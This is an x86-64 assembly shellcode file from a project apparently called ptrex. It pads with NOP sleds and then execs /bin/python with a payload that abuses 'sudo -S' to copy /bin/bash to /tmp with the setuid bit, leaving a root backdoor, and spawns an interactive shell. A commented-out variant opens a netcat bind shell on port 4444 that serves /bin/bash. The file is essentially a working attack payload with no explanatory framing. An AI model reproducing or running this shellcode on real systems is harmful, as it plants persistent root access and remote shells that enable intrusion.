; ptrex - MIT License - Copyright 2020
; David Reguera Garcia aka Dreg - dreg@fr33project.org
; -
; http://github.com/David-Reguera-Garcia-Dreg/ - http://www.fr33project.org/
; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:
; The above copyright notice and this permission notice shall be included in
; all copies or substantial portions of the Software.
; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
; FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
; IN THE SOFTWARE.

section .text
        global _start

_start:

        times 100 db 90h

        ; db 0CCh

        push 0

        call lxz
        arg2 db  `import os; os.system("echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1"); import pty; pty.spawn("/bin/bash");`,0
        times 250 db 41h

; arg2 db  `import os; os.system("/bin/nc -lvp 4444 -e /bin/bash")`,0

lxz:
        call drgs
        arg1 db `-c`,0
drgs:

        lea rax, [rel msg]
        push rax
        xor rdx, rdx            ; No Env
        mov rsi, rsp            ;argv
        lea rdi, [rel msg]   ; file
        mov rax, 59 ; __NR_execve
        syscall

        mov rax, 1 ; exit
        mov rbx, 0
        syscall

        msg db `/bin/python`,0
        times 150 db 42h

        times 100 db 90h

